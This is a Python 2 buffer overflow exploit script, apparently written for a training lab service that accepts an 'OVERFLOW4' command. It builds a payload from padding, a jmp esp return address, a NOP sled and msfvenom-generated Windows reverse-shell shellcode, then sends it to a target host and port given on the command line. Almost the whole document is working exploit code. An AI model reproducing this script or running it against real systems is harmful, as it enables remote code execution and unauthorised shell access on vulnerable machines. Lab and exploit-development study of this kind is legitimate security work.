#!/usr/bin/env python2

import socket
import sys
import logging

offset=2026

# address of jmp esp
jmp_esp="\x05\x12\x50\x62"

# NOP
nop="\x90"*20

# shellcode created with
# msfvenom -p windows/shell_reverse_tcp  LHOST=127.0.0.1 LPORT=5555 -f python  -b '\x00\xa9\xcd\xd4' -v shellcode
shellcode =  b""
shellcode += b"\xd9\xcf\xbd\x21\x03\x68\x22\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x6a\x17\x83\xea\xfc"
shellcode += b"\x03\x4b\x10\x8a\xd7\x77\xfe\xc8\x18\x87\xff"
shellcode += b"\xac\x91\x62\xce\xec\xc6\xe7\x61\xdd\x8d\xa5"
shellcode += b"\x8d\x96\xc0\x5d\x05\xda\xcc\x52\xae\x51\x2b"
shellcode += b"\x5d\x2f\xc9\x0f\xfc\xb3\x10\x5c\xde\x8a\xda"
shellcode += b"\x91\x1f\xca\x07\x5b\x4d\x83\x4c\xce\x61\xa0"
shellcode += b"\x19\xd3\x0a\xfa\x8c\x53\xef\x4b\xae\x72\xbe"
shellcode += b"\xc0\xe9\x54\x41\x04\x82\xdc\x59\x49\xaf\x97"
shellcode += b"\xd2\xb9\x5b\x26\x32\xf0\xa4\x85\x7b\x3c\x57"
shellcode += b"\xd7\xbc\xfb\x88\xa2\xb4\xff\x35\xb5\x03\x7d"
shellcode += b"\xe2\x30\x97\x25\x61\xe2\x73\xd7\xa6\x75\xf0"
shellcode += b"\xdb\x03\xf1\x5e\xf8\x92\xd6\xd5\x04\x1e\xd9"
shellcode += b"\x39\x8d\x64\xfe\x9d\xd5\x3f\x9f\x84\xb3\xee"
shellcode += b"\xa0\xd6\x1b\x4e\x05\x9d\xb6\x9b\x34\xfc\xde"
shellcode += b"\x68\x75\xfe\x1e\xe7\x0e\x8d\x2c\xa8\xa4\x19"
shellcode += b"\x1d\x21\x63\xde\x62\x18\xd3\x70\x9d\xa3\x24"
shellcode += b"\x59\x5a\xf7\x74\xf1\x4b\x78\x1f\x01\x73\xad"
shellcode += b"\xb0\x51\xdb\x1e\x71\x01\x9b\xce\x19\x4b\x14"
shellcode += b"\x30\x39\x74\xfe\x59\xd0\x8f\x69\x19\x25\x8f"
shellcode += b"\x68\x8d\x27\x8f\x7f\xfe\xa1\x69\x15\x10\xe4"
shellcode += b"\x22\x82\x89\xad\xb8\x33\x55\x78\xc5\x74\xdd"
shellcode += b"\x8f\x3a\x3a\x16\xe5\x28\xab\xd6\xb0\x12\x7a"
shellcode += b"\xe8\x6e\x3a\xe0\x7b\xf5\xba\x6f\x60\xa2\xed"
shellcode += b"\x38\x56\xbb\x7b\xd5\xc1\x15\x99\x24\x97\x5e"
shellcode += b"\x19\xf3\x64\x60\xa0\x76\xd0\x46\xb2\x4e\xd9"
shellcode += b"\xc2\xe6\x1e\x8c\x9c\x50\xd9\x66\x6f\x0a\xb3"
shellcode += b"\xd5\x39\xda\x42\x16\xfa\x9c\x4a\x73\x8c\x40"
shellcode += b"\xfa\x2a\xc9\x7f\x33\xbb\xdd\xf8\x29\x5b\x21"
shellcode += b"\xd3\xe9\x6b\x68\x79\x5b\xe4\x35\xe8\xd9\x69"
shellcode += b"\xc6\xc7\x1e\x94\x45\xed\xde\x63\x55\x84\xdb"
shellcode += b"\x28\xd1\x75\x96\x21\xb4\x79\x05\x41\x9d"
# Now compose the payload

buf ="OVERFLOW4 "

# Otherwise fill the buffer with junk until reaching the overflow
buf+="A"*offset

buf += jmp_esp
buf += nop
buf += shellcode
# Finally linefeed to send the buffer
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)
    
print s.recv(1024)
s.send(buf)
print s.recv(1024)